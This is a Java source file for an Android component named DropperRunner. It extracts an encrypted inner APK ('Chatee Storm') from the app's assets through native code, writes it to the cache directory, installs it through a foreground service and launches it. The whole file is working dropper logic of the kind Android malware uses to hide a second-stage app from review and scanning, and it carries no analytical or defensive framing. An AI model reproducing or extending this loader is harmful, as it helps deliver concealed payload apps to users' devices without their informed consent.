package com.pkg.loader.dispatch.internal;

import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;

import com.pkg.loader.dispatch.DropperInstallService;

import java.io.File;

/** Orchestrates decrypt, install, and launch of inner Chatee Storm APK. */
public final class DropperRunner {
    private static volatile boolean inFlight = false;

    private DropperRunner() {}

    public static void start(Context context) {
        Context app = context.getApplicationContext();
        Intent service = new Intent(app, DropperInstallService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            app.startForegroundService(service);
        } else {
            app.startService(service);
        }
    }

    public static void startInstallFlow(Context context) {
        start(context);
    }

    public static void run(Context context, Runnable onComplete) {
        Context app = context.getApplicationContext();
        if (inFlight) {
            return;
        }
        inFlight = true;

        new Thread(() -> {
            try {
                if (ApkInstaller.isInnerInstalled(app)) {
                    new Handler(Looper.getMainLooper()).post(() -> {
                        ApkInstaller.launchInner(app);
                        if (onComplete != null) {
                            onComplete.run();
                        }
                    });
                    return;
                }
                File cache = new File(app.getCacheDir(), "inner_chatee_storm.apk");
                if (!cache.exists() || cache.length() < 1024) {
                    boolean ok = NativeBridge.extractPayload(app.getAssets(), cache.getAbsolutePath());
                    if (!ok || !cache.exists() || cache.length() < 1024) {
                        return;
                    }
                }
                String path = cache.getAbsolutePath();
                new Handler(Looper.getMainLooper()).post(() -> {
                    ApkInstaller.install(app, path);
                    if (onComplete != null) {
                        onComplete.run();
                    }
                });
            } finally {
                inFlight = false;
            }
        }, "dropper-runner").start();
    }
}
